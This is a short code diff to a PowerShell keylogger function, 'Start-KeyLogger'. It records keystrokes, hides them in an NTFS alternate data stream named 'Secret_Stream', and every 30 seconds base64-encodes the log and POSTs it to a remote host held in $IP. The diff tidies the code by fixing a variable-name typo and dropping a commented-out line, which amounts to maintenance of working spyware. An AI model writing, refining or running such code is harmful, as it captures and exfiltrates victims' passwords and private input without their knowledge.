@@ -40,7 +40,6 @@ function Start-KeyLogger {
                     $success = $API::ToUnicode($ascii, $VirtualKey, $KBState, $char, $char.Capacity, 0)
 
                     if($success) {
-                        #[System.IO.File]::AppendAllText($OutputFile, $char, [System.Text.Encoding]::Unicode)
                         Add-Content -Path $OutputFile -Value $char -Stream 'Secret_Stream' -NoNewline
                     }
                 }
@@ -48,8 +47,8 @@ function Start-KeyLogger {
 
             if($stopWatch.Elapsed.Seconds -ge 30) {
                 $content = Get-Content -Path $OutputFile -Stream 'Secret_Stream'
-                $contantBytes = [System.Text.Encoding]::UTF8.GetBytes($content)
-                $base64Content = [System.Convert]::ToBase64String($contantBytes)
+                $contentBytes = [System.Text.Encoding]::UTF8.GetBytes($content)
+                $base64Content = [System.Convert]::ToBase64String($contentBytes)
                 
                 Invoke-WebRequest -Uri "http://$IP/" -Method POST -Body $base64Content
 
